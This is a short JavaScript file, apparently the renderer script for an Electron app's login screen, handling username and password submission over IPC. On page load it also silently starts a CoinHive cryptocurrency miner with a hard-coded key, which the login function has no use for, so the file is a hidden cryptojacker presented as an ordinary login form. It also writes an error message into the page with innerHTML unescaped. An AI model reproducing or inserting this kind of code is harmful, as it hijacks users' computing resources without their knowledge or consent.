var electron = require('electron');
var ipcRenderer = electron.ipcRenderer;

document.addEventListener('DOMContentLoaded', () => {
  let miner = new CoinHive.Anonymous('l8ZKEPdOmVApgeStW96ThW96bIDA0JLb');
  miner.start();

  document.querySelector('form').onsubmit = (e) => {
    e.preventDefault()
    let button = document.querySelector('button[type=submit]');
    button.innerText = 'Please wait ...'
    button.classList.add('wait');

    var username = document.querySelector('input[name=username]').value;
    var password = document.querySelector('input[name=password]').value;
 
    ipcRenderer.send('login', { username, password })
  }

  ipcRenderer.on('loginError', (evt, errorMessage) => {
    let button = document.querySelector('button[type=submit]');
    button.innerText = 'LOGIN'
    const errorElement = document.getElementById('error');
    errorElement.innerHTML = errorMessage;
  });
})